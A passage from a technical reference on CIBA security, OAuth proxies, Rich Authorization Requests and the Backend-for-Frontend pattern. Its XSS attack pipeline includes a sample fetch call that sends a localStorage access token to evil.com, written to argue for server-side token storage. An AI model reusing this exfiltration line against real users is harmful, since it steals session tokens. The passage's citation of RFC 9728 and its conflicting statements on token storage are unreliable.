passages.text: CIBA introduces unique security considerations because the authentication request and the user's approval occur on different channels and different devices. The client communicates with the OP over a server-to-server backchannel, while the OP contacts the user via an out-of-band delivery mechanism (push notification, SMS, in-app prompt). This decoupling creates threat surfaces that do not exist in redirect-based flows.
Attacker obtains client credentials and sends CIBA requests
Unauthorised authentication requests delivered to users
private_key_jwt client authentication; PAR for request integrity (§34.4)
Attacker probes with different login_hint values to discover valid accounts
Discloses valid user accounts — enables targeted phishing
OP returns identical error responses for unknown and known users
Binding message manipulation
Malicious or compromised client sends misleading binding message
User approves unintended action (e.g., wrong amount or payee)
Client vetting via FAPI-CIBA; scope restrictions; regulatory amount limits
Attacker intercepts push notification between OP and push service
Learns about pending authentication requests (no tokens in notification)
Encrypted push channel (TLS between OP and push service); no sensitive data in notification payload
Attacker sends forged ping/push to client notification endpoint
Client processes fraudulent tokens or takes unauthorised action
client_notification_token validation on every callback; mutual TLS for callback endpoint
Attacker captures and replays an access token at the resource server
Unauthorised resource access
Sender-constrained tokens (DPoP — §39.3, or mTLS — §39.4); short token lifetime
Attacker guesses user_code and approves request on user's behalf (§34.3.3)
Rate limiting (max 5 attempts per auth_req_id); sufficient entropy (≥20\geq 20≥20 bits); short expiry
Attacker forces a known auth_req_id into the client's flow
Client receives tokens bound to the attacker's session
Client generates its own correlation nonce; OP validates auth_req_id uniqueness

The client_notification_token is a shared secret between the client and the OP. It authenticates the OP's callbacks to the client's notification endpoint in ping and push modes. The following security requirements apply:
Entropy — minimum 128 bits of entropy (at least 16 bytes, base64url-encoded to 22+ characters). A UUID v4 provides 122 bits — adequate for most deployments
Transport — MUST be transmitted over HTTPS during registration and during the CIBA request
Storage — MUST be stored encrypted at rest by both the client and the OP, with access restricted to the CIBA callback handler
Rotation — SHOULD be rotated periodically (e.g., every 90 days) and immediately on any suspected compromise
Scope — MUST be unique per client instance — not shared across clients or across multiple notification endpoints
When the OP supports the user_code parameter (§34.3.3), the code must have sufficient entropy to resist brute-force guessing:
With a 6-character alphanumeric code (A–Z, 0–9), the entropy is:

This provides adequate entropy against brute-force attacks, especially when combined with rate limiting (e.g., maximum 5 incorrect attempts per auth_req_id). The user code's primary purpose is to prevent unsolicited authentication requests — it is not a substitute for the user's biometric or PIN authentication on the Authentication Device.
CIBA requests must include replay protection mechanisms at multiple layers:
auth_req_id uniqueness — the OP must generate cryptographically random auth_req_id values (at least 128 bits of entropy). Duplicate IDs must be rejected to prevent session fixation
JTI uniqueness (JAR) — in FAPI-CIBA, the signed request JWT must include a unique jti claim (RFC 9101); the OP must reject duplicate JTI values within the token's validity window
Timestamp freshness — the OP must enforce exp and iat validation on signed requests (maximum clock skew: typically 60 seconds) to prevent replay of expired request objects
Login hint token expiry — the login_hint_token JWT must have a short expiry (recommended: 60 seconds) to prevent replay of stale user identification tokens
When the user authenticates on their device, the OP must enforce the following verification requirements:
Device registration — the authentication device must be pre-registered with the OP. Unregistered devices must not be allowed to approve CIBA authentication requests
Session binding — the pending authentication request must be linked to the specific user's device, preventing cross-user approval (where User B's device approves a request intended for User A)
Transaction context display — the binding message must be displayed verbatim (§34.3.2). The OP must not truncate or rephrase the message in a way that removes critical transaction information
Explicit consent — the user must take a deliberate action to approve. No pre-checked checkboxes, no "always approve this application" without re-authentication, and no silent background approval
The OP should implement rate limiting on several vectors to prevent abuse and denial-of-service:
Prevent client credential abuse and notification spam
Prevent notification fatigue and user harassment
/token polling per auth_req_id
Respect interval + 1 request/second
Prevent OP overload from aggressive polling
User code attempts per auth_req_id
Prevent brute-force guessing of the user code
Notification endpoint callbacks
3 retries with exponential backoff
Prevent amplification attacks via spoofed callbacks

CIBA clients must register specific metadata with the OpenID Provider before initiating backchannel authentication. This registration can be performed dynamically (RFC 7591) or statically (pre-configured by the OP administrator).
A CIBA client registers using the standard OIDC Dynamic Client Registration protocol (RFC 7591) with CIBA-specific metadata fields:
MUST include urn:openid:params:grant-type:ciba
backchannel_token_delivery_mode
One of poll, ping, or push — determines the response mode for all CIBA requests from this client
backchannel_client_notification_endpoint
Required for ping and push modes — the HTTPS URL where the OP sends callback notifications
backchannel_authentication_request_signing_alg
Algorithm for signing the CIBA request (JAR); required by FAPI-CIBA (typically PS256 or ES256)
backchannel_user_code_parameter
Boolean — whether the client supports the user_code parameter (§34.3.3)
For production deployments — particularly in financial services and regulated sectors — static client registration (pre-registered clients) is preferred over dynamic registration:

Pre-vetted client metadata — the OP administrator reviews and approves the client's capabilities, scopes, and notification endpoint before deployment, ensuring no malicious or misconfigured client can interact with the OP
Stable notification endpoint — the notification endpoint URL is verified and tested for connectivity, TLS configuration, and response behaviour before production use
Key registration — the client's public keys are registered directly in the OP's database via a trusted channel, avoiding the JWK trust-on-first-use (TOFU) problem inherent in dynamic registration
Scope pre-authorization — the client's allowed scopes are determined at registration time, not at request time, limiting the client's potential privilege scope

Static registration aligns with the client authentication methods described in §3.4 — the client's credentials (signing keys or TLS certificates) are provisioned out-of-band and registered with the OP before any CIBA requests are made.
The OP must validate client registration metadata against the following rules:
backchannel_client_notification_endpoint
MUST be HTTPS — plaintext HTTP endpoints are rejected
backchannel_client_notification_endpoint
SHOULD verify connectivity before accepting registration (OP sends a test request)
backchannel_token_delivery_mode
MUST be one of the OP's advertised supported modes
backchannel_authentication_request_signing_alg
MUST be in the OP's supported algorithms list
MUST include the CIBA grant type (urn:openid:params:grant-type:ciba)
MUST be supported by the OP — private_key_jwt or tls_client_auth for FAPI-CIBA (§34.4)

Production CIBA deployments encounter a consistent set of implementation mistakes and architectural anti-patterns. This section catalogues the most common failure modes observed across financial services, open banking, and AI agent approval workflows.

Polling too aggressively. Ignoring the interval parameter and polling every second or less wastes OP resources and may trigger rate limits. The OP returns slow_down to signal the client should increase its polling interval (§34.2.1). Implementations commonly use exponential backoff on transient errors while maintaining the minimum interval on authorization_pending responses.

Not handling notification loss. In ping and push modes, network issues can cause the notification to be lost. Implementations should maintain a fallback timer: if no notification arrives within the expires_in window, treat the request as expired and optionally initiate a new CIBA request. For ping mode, a hybrid approach combining ping notification with a background poll is recommended (§34.2.5).

Storing notification tokens in plaintext. The client_notification_token is a bearer token — if an attacker reads it from the client's configuration file, they can forge notification callbacks and trigger premature token retrieval. Always store it encrypted at rest and never include it in logs or error messages.

Not validating the notification source. Accepting any POST to the notification endpoint without validating the Authorization: Bearer header. This allows attackers to forge authentication completions — the client receives a notification for an auth_req_id it never requested, exchanges it for tokens, and proceeds with an unauthorised action.

Binding message truncation. The OP displays a truncated binding message that removes critical information (e.g., showing "Pay €2…" instead of "Pay €250 to ACME Corp"). The OP must display the full message verbatim or, at minimum, never truncate the amount or counterparty fields.

Using CIBA when a redirect-based flow would suffice. If the user is operating the same device with a browser, the Authorization Code Flow (§3.2.1) is simpler, better understood, and has broader tooling support. CIBA should only be used when decoupled authentication is a genuine requirement — the user is physically elsewhere, or the client device has no browser.

No timeout on the consumption device. The POS terminal or call centre agent interface shows "waiting for authentication" indefinitely. If the user never authenticates, the request eventually expires on the OP, but the consumption device never updates its UI. Implement a client-side timeout that matches the OP's expires_in value and display a meaningful expiry message.

Single-threaded notification handling. The notification endpoint handles one callback at a time. In high-volume deployments (e.g., a call centre with 500 agents), this creates a bottleneck. The notification endpoint must be horizontally scalable and handle concurrent callbacks for different auth_req_id values.

Ignoring idempotency. The OP may retry a notification (ping or push) if the client does not respond with HTTP 200 or 204. The client's notification handler must be idempotent: processing the same auth_req_id twice must not cause duplicate token storage or duplicate action execution at the resource server.

Using symmetric signing algorithms. FAPI-CIBA requires asymmetric signing algorithms (PS256, ES256). Using HS256 (HMAC-SHA256) with a shared secret violates the proof-of-key-possession requirement and is explicitly prohibited. The signing algorithm is enforced during client registration metadata validation.

Accepting request_uri directly in /bc-authorize. In FAPI-CIBA, the request_uri must reference a pushed authorization request created via the PAR endpoint (RFC 9126). If the OP accepts arbitrary request_uri values, an attacker can inject parameters by crafting their own request URIs.

Not enforcing refresh token rotation. FAPI-CIBA requires that refresh tokens be rotated (one-time use). If the OP allows reuse of refresh tokens, a stolen refresh token grants long-term access — the entire security benefit of rotation is negated.
Missing monitoring. CIBA introduces new operational metrics that must be monitored to detect degradation, abuse, and delivery failures:
Pending authentication requests (OP)
Scale OP; check for user notification delivery issues
Notification callback latency (client)
Check notification endpoint health; scale horizontally
Verify clients respect interval; implement slow_down
Expired authentication requests (OP)
Investigate notification delivery; check user engagement
Notification delivery failure rate (OP)
Check push service connectivity; verify retry logic

No graceful degradation. If the push notification service is down, users cannot receive CIBA authentication requests. The OP should have fallback notification channels (SMS, email) or a maintenance mode that informs clients and users of the outage.

This group examines how identity is sustained following the initial authentication event. It provides a deep dive into session token types, Kerberos ticket infrastructure, device-bound session protocols (DBSC, DPoP, mTLS), CIAM/WIAM architecture variants, and the emerging continuous access evaluation standards (CAEP, SSF).

Browser-based applications — single-page applications (SPAs), progressive web apps, and JavaScript-heavy frontends — face a fundamental security dilemma when integrating with OAuth 2.0 and OpenID Connect. OAuth 2.0 was originally designed for server-to-server communication where the client application maintains a secret. The authorization code grant (RFC 6749, §6.1) assumes the client can securely store a client_secret and exchange the authorization code on a trusted backend. When the specification was written, the primary clients were web applications running on servers — not single-page applications running inside a user's browser. The migration of OAuth into browser-based applications created a fundamental architectural tension:
passages.headingText: 35. OAuth Flow Wrapping and Proxy Patterns

passages.text: Browser Client→needs tokenProtected ResourcebutBrowser≠Trusted Environment\text{Browser Client} \xrightarrow{\text{needs token}} \text{Protected Resource} \qquad \text{but} \qquad \text{Browser} \neq \text{Trusted Environment}Browser Clientneeds token​Protected ResourcebutBrowser=Trusted Environment
passages.headingText: 35. OAuth Flow Wrapping and Proxy Patterns

passages.text: JavaScript executing in the browser operates in an inherently untrusted environment — any script running in the same origin (including scripts injected via XSS vulnerabilities, malicious browser extensions, or compromised third-party dependencies) can access the same memory, storage, and DOM. When OAuth tokens reside in the browser, a single XSS vulnerability can exfiltrate access tokens, refresh tokens, and ID tokens — granting the attacker the full authenticated session. Additionally, CSRF attacks in OAuth contexts can lead to unauthorized authentication (binding the attacker's IdP account to the victim's session), unauthorized logout, and state-changing API operations via the victim's session cookie.
passages.headingText: 35. OAuth Flow Wrapping and Proxy Patterns

passages.text: This chapter examines the architectural patterns that address this problem by moving the OAuth security boundary from the browser (untrusted) to the server (controlled infrastructure). The progression moves from general-purpose OAuth proxies through the Backend-for-Frontend (BFF) pattern codified by the IETF, to specialised implementations like the Token Handler pattern, and finally to the browser-native Credential Manager APIs that reshape how federated authentication works in the post-third-party-cookie era. The common thread: the browser should never see, store, or transmit an OAuth token.
passages.headingText: 35. OAuth Flow Wrapping and Proxy Patterns

passages.text: When a browser-based application executes the OAuth 2.0 Authorization Code flow directly — acting as the OAuth client — the tokens returned by the authorization server must be stored somewhere in the browser:
✅ Fully accessible to any script in the same origin — XSS exfiltrates tokens trivially
❌ Not sent automatically with requests
Survives page reload and browser restart
✅ Fully accessible to any script in the same origin
❌ Not sent automatically with requests
Cleared when the tab is closed
JavaScript variable (in-memory)
✅ Accessible via XSS but harder to exfiltrate (no persistent storage to scan)
Lost on page reload — user must re-authenticate
✅ Accessible if cookie is not HttpOnly
✅ Sent automatically with requests — CSRF attack vector
Configurable via Expires/Max-Age
Cookie (HttpOnly, Secure, SameSite=Strict)
❌ Not accessible to JavaScript
❌ Not sent cross-site (Strict)
Configurable via Expires/Max-Age

Every browser storage option exposes tokens to XSS. The only question is the degree of difficulty for the attacker. localStorage is the worst case — an XSS payload can enumerate all keys and exfiltrate every token in a single operation. In-memory storage is marginally better because the attacker must execute JavaScript while the application is running, but modern XSS payloads routinely achieve this. The fundamental problem is not which storage mechanism to use — it is that tokens should not exist in the browser at all.

A complete session compromise via XSS follows a predictable pipeline: (1) XSS injection through a reflected parameter, stored comment field, or compromised third-party dependency → (2) token exfiltration via fetch('https://evil.com/steal?t=' + localStorage.getItem('access_token')) → (3) token replay against the resource server within the validity window → (4) session hijacking — if a refresh token is also stolen, the attacker obtains new access tokens indefinitely → (5) lateral movement across all APIs authorised by the original OAuth consent. The probability of successful exploitation can be modelled as:

P(compromise)=P(XSS)×P(token accessible∣XSS)×P(replay succeeds∣token)P(\text{compromise}) = P(\text{XSS}) \times P(\text{token accessible} \mid \text{XSS}) \times P(\text{replay succeeds} \mid \text{token})P(compromise)=P(XSS)×P(token accessible∣XSS)×P(replay succeeds∣token)

For a SPA storing tokens in localStorage, P(tokenaccessible∣XSS)≈1.0P(\text\\{token accessible\\} \mid \text\\{XSS\\}) \approx 1.0P(tokenaccessible∣XSS)≈1.0, making any XSS vulnerability a full session compromise. This is the core security argument driving OAuth proxy patterns.

An OAuth proxy is a server-side reverse proxy that interposes between the browser and the upstream application or API. The proxy is the OAuth client — not the browser. The proxy handles the entire OAuth ceremony on the server side and exposes only an opaque session cookie to the browser:

Intercept unauthenticated requests — The proxy receives requests from the browser. If no valid session cookie is present, the proxy redirects the browser to the authorization server's authorize endpoint
Initiate the Authorization Code flow — The proxy generates the PKCE code_verifier and code_challenge, constructs the authorization request, and redirects the browser

Exchange the authorization code for tokens — After the user authenticates at the authorization server, the browser is redirected back to the proxy with the authorization code. The proxy exchanges the code at the token endpoint (server-to-server) using its client credentials — private_key_jwt (§3.4) or tls_client_auth for confidential client authentication

Store tokens server-side — The proxy stores the access token, refresh token, and ID token in a server-side session store — in-memory, Redis, a database, or encrypted in an HttpOnly cookie. The tokens never reach the browser

Set an opaque session cookie — The proxy sets an HttpOnly, Secure, SameSite=Lax (or Strict) cookie in the browser. The cookie value is an opaque session identifier — it does not contain the access token

Proxy authenticated requests — Subsequent requests from the browser arrive with the session cookie. The proxy looks up the session, retrieves the access token from the server-side store, and injects it into the Authorization: Bearer header before forwarding the request to the upstream service
The proxy propagates user identity to upstream services through HTTP headers. The specific headers depend on the upstream service's expectations:
Standard OAuth token forwarding
Upstream must validate the token
Must be set server-side only, never from client
Must be derived from verified ID token claims
Must preserve original IP chain
Identifies the authentication source
Enables upstream multi-IdP routing

Security rule: the proxy must never trust client-supplied identity headers. An attacker could craft a request with X-User-Id: admin to escalate privileges. The proxy must always strip any incoming identity headers before forwarding, and set them exclusively from the verified session data.

The browser never sees, stores, or transmits an OAuth token. The browser possesses only an opaque session cookie. An XSS attack can steal the cookie value, but the cookie is HttpOnly (inaccessible to JavaScript), Secure (transmitted only over HTTPS), and SameSite (not sent with cross-origin requests). Even if an attacker extracts the session cookie via a non-JavaScript vector (e.g., a network-level attack), the cookie does not contain the access token — the attacker cannot use it to call APIs directly without routing through the proxy.
When the access token expires, the proxy must perform a silent refresh using the stored refresh token. This is entirely server-side and transparent to the browser:

Proxy→detect tnow>texpiresRefresh:POST /token with grant_type=refresh_token\text{Proxy} \xrightarrow{\text{detect } t_{\text{now}} > t_{\text{expires}}} \text{Refresh}: \text{POST /token with grant\_type=refresh\_token}Proxydetect tnow​>texpires​​Refresh:POST /token with grant_type=refresh_token

If the refresh succeeds, the proxy updates the session store with new tokens and continues serving the request. If the refresh fails (expired refresh token, revoked session), the proxy clears the session cookie and redirects the browser to the authorization server for re-authentication. The browser never participates in token refresh — it continues sending the same session cookie.

OAuth proxy architectures must handle logout at multiple levels: clearing the local session cookie, revoking tokens at the IdP, and propagating the logout to all upstream services that received tokens derived from the same session:
User initiates logout — the browser sends POST /oauth/logout to the proxy
Proxy clears session — the proxy deletes the session from the session store (Redis, database, etc.)
Proxy clears cookie — the proxy returns Set-Cookie: _oauth_proxy_session=; Max-Age=0; HttpOnly; Secure; SameSite=Lax
Proxy revokes tokens — the proxy calls the IdP's revocation endpoint (RFC 7009): POST /revoke with the access token and refresh token
Proxy redirects — the proxy redirects the browser to a post-logout landing page (or the IdP's end_session_endpoint for front-channel logout)

The revocation step (step 4) is critical. Without it, the access token and refresh token remain valid at the IdP until their natural expiry, creating a window where a stolen token could still be replayed.
Several production-ready open-source OAuth proxy implementations exist, each with different design goals, deployment models, and feature sets:
Static groups, email domains
SSO: Yes / SLO: front-channel
SSO: Yes / SLO: RP-initiated
SSO: Yes / SLO: front-channel

oauth2-proxy is the most widely deployed OAuth proxy in Kubernetes environments. It integrates directly with nginx's auth_request directive and serves as the de facto standard for ingress-level authentication in Kubernetes clusters. Strengths: mature and battle-tested, excellent Helm chart, supports multiple upstream providers simultaneously, configurable session storage (cookie for stateless, Redis/Memcached for stateful). Weaknesses: no built-in policy engine, no SAML support, single-logout support is limited to OIDC front-channel.

Pomerium is a zero-trust access proxy implementing a full policy engine based on Google's CEL (Common Expression Language). It enables complex access control rules (e.g., "allow access only if user.department == 'engineering' and request.time.hour >= 9"). Strengths: identity-aware proxying with per-route policies, enterprise features (SAML support, audit logging, DLP headers), supports both identity-aware proxying and ZTNA patterns. Weaknesses: more complex to configure due to the policy engine, AGPL 3.0 license, heavier resource footprint than lightweight alternatives.

Authelia is a self-hosted identity and access management portal providing SSO, 2FA, and authorization as a single component. Unlike oauth2-proxy (which delegates to an external IdP), Authelia can act as both the proxy and the authentication provider. Strengths: built-in multi-factor authentication (TOTP, WebAuthn, push notifications), comprehensive web UI for user management, supports OpenID Connect as both RP and provider. Weaknesses: designed primarily for self-hosted environments, configuration can become complex for large deployments.

Vouch Proxy is a lightweight SSO proxy designed primarily for nginx deployments. Strengths: minimal resource footprint (suitable for Raspberry Pi and small VPS), simple YAML configuration, tight nginx integration via auth_request. Weaknesses: limited OIDC support (no dynamic client registration, no token exchange), session storage is cookie-only, no policy engine or fine-grained access control.
Kubernetes ingress authentication — The most common production deployment of oauth2-proxy uses nginx ingress annotations to protect services:

The nginx ingress controller sends a subrequest to the oauth2-proxy /oauth2/auth endpoint before forwarding the client's request to the upstream service. If the subrequest returns HTTP 202, the request is authenticated — nginx forwards it with the identity headers injected by oauth2-proxy. If the subrequest returns HTTP 401, nginx redirects the client to the oauth2-proxy sign-in endpoint, which initiates the OAuth flow.

Cloud-native API gateways — Azure API Management, Kong, and Envoy all support OAuth proxy patterns. Azure APIM's Credential Manager acts as a server-side OAuth client — it performs the authorization code exchange, stores tokens in its internal credential store, and injects the access token into backend API calls. Kong's OpenID Connect plugin implements the proxy pattern natively, supporting code flow, session management, and token refresh.

Traditional OAuth 2.0 scopes are simple, space-delimited strings (e.g., openid profile email payments:read). This flat scope model is inadequate for complex authorization scenarios where the resource server needs structured, granular authorization data. Rich Authorization Requests (RAR, RFC 9396) extend OAuth authorization requests with structured authorization details that convey fine-grained permission semantics.

The core problem RAR solves: a payment initiation API needs to know not just that the client has "payment" scope, but which specific payment the client is authorized to initiate, for what amount, and from which account. Simple scopes cannot encode this information. RAR amplifies the expressiveness of authorization requests that an OAuth proxy can issue on behalf of the browser application.
Each authorization detail object in the authorization_details parameter contains:
URI identifying the type of authorization (registered in IANA registry or defined by resource server)
Array of resource server URIs where the authorization applies
Array of permitted actions (e.g., read, write, execute)
Array of data types the client can access
Transaction or resource identifier
Type-specific fields defined by the authorization detail type specification
The proxy submits this structured authorization request via the authorization_details parameter in a standard OAuth authorization request:

The authorization_details parameter is URL-encoded JSON. The browser application specifies the desired transaction parameters to the proxy via its application API — the proxy translates these into the RAR JSON structure and includes them in the OAuth authorization request. The resulting access token is bound to the specific authorization details — the resource server can inspect the authorization_details claim in the token to enforce that the token is used only for the approved transaction.

RAR in OAuth proxy and BFF contexts introduces a new consideration: the proxy must be configured to forward structured authorization details to the IdP and to interpret the resulting access token's authorization data. In a standard OAuth proxy deployment, the proxy uses a fixed set of scopes configured at deployment time. RAR requires the proxy to support dynamic authorization details that vary per request:
The proxy must accept authorization details from the SPA — typically via a custom header or query parameter
The proxy must include authorization details in the authorization request — modifying the standard redirect flow
The proxy must store authorization details in the session — to ensure subsequent requests use the same authorization context
The proxy must validate that the access token's claims match the requested details — ensuring the IdP granted the requested permissions
RAR support in OAuth proxy implementations is emerging: oauth2-proxy has experimental RAR support, and Pomerium supports RAR through its policy engine.
Scopes vs. Rich Authorization Requests:
Rich Authorization Requests (RFC 9396)
Coarse-grained (per resource server)
Fine-grained (per resource, action, datatype)
Universal (all OAuth implementations)
Emerging (limited IdP support)
Keycloak, Auth0, Okta (2025+)
Strong (PSD2, Open Banking, FHIR)
May increase token size significantly

RAR is particularly relevant in regulated industries where authorization must be specific to a particular transaction or data resource. The EU's Payment Services Directive 2 (PSD2) and the Open Banking ecosystem are primary drivers of RAR adoption, as they require granular, auditable consent for payment initiation and account access.
1. Web Client triggers payment action

The browser attempts an action requiring elevated permissions (e.g. POST /transfer) by sending a request to the API Gateway. The Gateway detects that the current session lacks the granular authorization needed.
2. API Gateway redirects Web Client with RAR payload
The Gateway constructs a JSON authorization_details payload containing the specific transaction parameters (amount, payee) and returns a 302 Redirect sending the client to the Identity Provider.
3. Web Client forwards RAR request to Identity Provider
The browser follows the redirect to the OP's /authorize endpoint, carrying the Rich Authorization Request within the parameters.
4. Identity Provider parses RAR and renders dynamic consent
The OP parses the structured JSON and presents a tailored consent screen to the user, strictly corresponding to the specific transfer details rather than generic scopes.
5. User explicitly consents to the transaction
The user confirms the exact transaction request via the OP's interface, providing unique consent bound to the RAR details.
6. Identity Provider issues dynamically provisioned Access Token
The OP returns an Access Token containing the embedded authorization details. The API Gateway validates this structured token and securely executes the transfer.

The Backend-for-Frontend pattern assigns each frontend application a dedicated backend that serves as the OAuth confidential client. RFC 9728 ("OAuth 2.0 for Browser-Based Apps") explicitly recommends this architecture as the preferred approach for browser-based OAuth clients. The BFF's key architectural properties: the BFF and SPA share the same origin (eliminating cross-origin concerns); the BFF acts as a confidential OAuth client with a client_secret; session state is communicated via SameSite cookies; the SPA never receives or stores OAuth tokens; the BFF performs token relay to upstream APIs. Unlike a general-purpose OAuth proxy, the BFF is application-aware — it is purpose-built for a specific frontend and exposes a tailored API.

The Backend-for-Frontend pattern assigns each frontend application — SPA, mobile app, or web client — a dedicated backend that serves as the OAuth confidential client. Unlike a general-purpose OAuth proxy that authenticates requests to arbitrary upstream services, a BFF is purpose-built for a specific frontend and exposes a tailored API for authentication lifecycle operations:
Login initiation — The frontend calls GET /bff/login → the BFF redirects to the authorization server
Session status — The frontend calls GET /bff/session → the BFF returns the current user's profile, token expiry, and session metadata

API proxy — The frontend calls POST /bff/api/orders → the BFF retrieves the access token from its session store, attaches it as Authorization: Bearer, and forwards the request to the downstream resource server

Token refresh — When the access token expires, the BFF uses the refresh token to obtain a new access token transparently. The frontend is unaware that token refresh occurred — it continues calling BFF endpoints with the same session cookie
Logout — The frontend calls POST /bff/logout → the BFF revokes tokens at the authorization server (RFC 7009), clears the server-side session, and clears the session cookie
Why BFF over a public client (SPA-direct) flow?
❌ Cannot store — exposed in JavaScript
✅ Stored server-side — never exposed to browser
Client authentication method
none — PKCE is the only protection
private_key_jwt or tls_client_auth (§3.4)
Browser — localStorage, sessionStorage, or in-memory
Server-side — Redis, database, or encrypted cookie
❌ Tokens never reach the browser
Risky — if stored in browser, XSS can exfiltrate and use it indefinitely
Safe — stored server-side, used only by the BFF
DPoP possible but limited (browser must manage DPoP key pair)
DPoP (§39.3) and mTLS certificate-bound tokens (§39.4) both available
Frontend must implement token refresh logic and handle race conditions
BFF handles refresh transparently — frontend is unaware
The frontend communicates with the BFF exclusively via HttpOnly, Secure, SameSite cookies. The BFF maintains a server-side session store that maps session identifiers to token sets:
access_token: eyJhbG...refresh_token: dGhpcyBp...id_token: eyJhbGciOi...expires_at: 2026-03-26T01:30:00Zuser: \{sub: "jane", email: "j@..."\}
When the frontend makes an API call through the BFF:
The browser sends the request with the session cookie (automatic — SameSite=Lax allows same-site navigation)
The BFF extracts the session ID from the cookie
The BFF looks up the session in the store → retrieves the access token
If the access token is expired or near-expiry, the BFF uses the refresh token to obtain a new access token from the authorization server, updates the session store, and proceeds
The BFF attaches the access token as Authorization: Bearer and forwards the request to the downstream resource server
The resource server responds → the BFF forwards the response to the frontend

The frontend never participates in token management. From the frontend's perspective, the BFF is a regular API — it sends cookies, receives responses, and is oblivious to the OAuth infrastructure behind the BFF.

Because both the SPA and BFF share the same origin, all requests are same-origin: no CORS preflight is needed for standard content-type requests, cookies are automatically included in every request, no explicit token management is required in the SPA code, and XSS can make requests on behalf of the user (the cookie is sent automatically) but the attacker cannot read or extract the cookie value itself.

The SPA handles only two error cases from the BFF: 401 Unauthorized (trigger a redirect to the login flow) and 403 Forbidden (display an access denied message). All token refresh, retry, and error recovery logic is handled by the BFF server-side.

Session cookie configuration. The BFF session cookie should use the __Host- prefix (e.g., __Host-sid), which browsers enforce with additional security guarantees: the cookie must have Path=/, must not have a Domain attribute, and must have Secure set. This provides defense-in-depth against cookie overwrite attacks where a malicious subdomain attempts to set a conflicting cookie on a parent domain:
SameSite cookie behaviour is the primary browser-level CSRF defense. For OAuth proxy and BFF architectures, SameSite=Lax is the recommended setting:
Cross-Site GET (top-level nav)
*Default behaviour depends on browser. Chrome, Safari, and Firefox all default to Lax.

SameSite=Lax blocks cross-site POST requests (preventing CSRF on state-changing operations) while allowing top-level navigation GET requests (required for the OAuth redirect callback). The one remaining CSRF vector with SameSite=Lax is a top-level navigation attack, mitigated by the OAuth state parameter validated server-side.
BFF microservices token architecture. In a microservices deployment, each component in the BFF architecture uses a distinct token type with different storage and lifetime characteristics:

The token flow through these layers: (1) browser authenticates via OAuth 2.0 redirect, BFF exchanges the authorization code for tokens; (2) BFF stores the AT and RT in separate HttpOnly cookies returned to the browser; (3) browser sends requests with cookies, BFF extracts the AT, validates it, and forwards a JWT to downstream microservices; (4) when the AT expires, the BFF silently uses the RT to obtain a new AT (transparent to the browser); (5) on logout, the BFF clears cookies and revokes the RT at the authorization server.
1. Browser initiates login by calling the BFF login endpoint

The Browser (SPA) detects that the user is not authenticated (no valid session cookie, or the /bff/session endpoint returns 401) and actively navigates to the BFF's login endpoint. This represents a simple HTTP GET — the SPA never constructs any OAuth parameters. The BFF exclusively manages all OAuth protocol logic; the SPA merely triggers the flow.
Artifact Produced: None (Navigation initiation)
2. BFF generates PKCE parameters and OAuth state

The BFF cryptographically generates the PKCE code_verifier (a random 43–128 character string), dynamically computes the code_challenge (SHA-256 hash of the verifier, Base64url-encoded), securely generates a random state parameter for CSRF protection, and natively generates a nonce for ID token replay prevention (RFC 7636, §4.1). These values are stored exclusively in the BFF's server-side session — they are strictly never exposed to the frontend browser.
Artifact Produced: bff_pre_auth_session
3. BFF redirects the browser to the authorization server

The BFF actively responds with an HTTP 302 redirect natively pointed to the Authorization Server's /authorize endpoint, explicitly including response_type=code, the BFF's client_id, the PKCE code_challenge, the tightly bound redirect_uri pointing back to the BFF's callback endpoint, the state parameter, the nonce, and the officially requested scope (RFC 6749, §4.1.1).
Artifact Produced: None (Browser redirect)
4. Browser navigates to the authorization server
The Browser automatically follows the redirect and visibly lands on the Authorization Server's login page, securely carrying the PKCE challenge parameters strictly initialized by the backend.
5. Authorization Server renders the login page
The Authorization Server securely presents the interactive HTML login interface directly to the user.
Artifact Produced: None (Interactive UI)
6. User authenticates at the authorization server

The User interacts directly with the Authorization Server's login page — manually entering credentials, completing MFA (push notification, TOTP, passkey — §14), and explicitly granting semantic consent. The BFF remains completely isolated from this sensitive phase.
Artifact Produced: idp_sso_session
7. Authorization Server redirects browser to BFF callback

After successful authentication, the Authorization Server dynamically redirects the Browser immediately back to the BFF's exact callback URI mapping, seamlessly appending the authorization code and the state parameter cleanly to the URL.
Artifact Produced: authorization_code (ephemeral)
8. Browser delivers the authorization code to the BFF callback

The Browser flawlessly follows the redirect directly to the BFF's precise callback endpoint (/callback?code=abc123&state=xyz). The BFF strictly validates the state parameter exactly against the mathematical value securely stored in step 2.

Rejection Scenario: If the inbound state parameter explicitly differs from the stored state (or is completely missing), the BFF forcefully aborts the protocol. It categorically rejects the request and logs a BFF_OAUTH_STATE_MISMATCH SIEM event alerting to a potential Cross-Site Request Forgery (CSRF) injection attack.
Artifact Produced: None (State validation execution)
9. BFF exchanges the authorization code for tokens at the authorization server

The BFF strongly authenticates and transmits a server-to-server POST strictly to the Authorization Server's token endpoint (RFC 6749, §4.1.3). This explicit request mathematically includes the authorization code, the original PKCE code_verifier, and the BFF's distinct client authentication (private_key_jwt — a signed JWT assertion using the backend's private key). This transport exchange executes entirely server-side — the Browser literally never touches the tokens.
Artifact Produced: None (Backend request)
10. Authorization Server returns tokens to the BFF

The Authorization Server securely validates the code and PKCE parameters, explicitly responding with the standard token payload containing the access token, refresh token, ID token, and expires_in. The BFF flawlessly validates the ID token signature, rigidly checks the nonce claim against its stored memory (preventing replay), and mathematically verifies the iss, aud, and exp claims.
Artifact Produced: access_token, refresh_token, id_token
11. BFF stores tokens in server-side session store

The BFF autonomously creates a new persistent session entry cleanly localized within its server-side store (Redis, Postgres, or explicitly in-memory), securely mapping a newly generated high-entropy session ID functionally to the official token set. The session ID actively bears absolutely no mathematical relationship to the tokens it conceals.
Artifact Produced: bff_secure_session_record
12. BFF sets session cookie and redirects browser to the application

The BFF dynamically responds with a 302 redirect directed right to the SPA's exact origin (e.g., https://app.example.com) and strictly sets the session cookie. The cookie intentionally utilizes the __Host- prefix (enforcing Secure, Path=/, and no Domain attribute), HttpOnly (blocking JavaScript access), and SameSite=Lax. The Browser now actively maintains a secure session state without possessing any OAuth credential data (draft-ietf-oauth-browser-based-apps, §9.2).
Artifact Produced: __Host-sid (opaque session cookie)
13. Browser makes an API call through the BFF

The Browser (SPA) seamlessly sends an established API request cleanly directed to the BFF's proxy endpoint (e.g., /bff/api/orders). The Browser automatically attaches the secure session cookie. The SPA never injects an Authorization header.
14. BFF retrieves the access token and handles refresh if needed

The BFF securely parses the session ID exactly from the cookie, mathematically retrieves the bound access token from the backend store, and actively checks the token expiry. If the access token recently expired natively, the BFF autonomously leverages the backend refresh token to securely request a new access token from the Authorization Server entirely transparently.
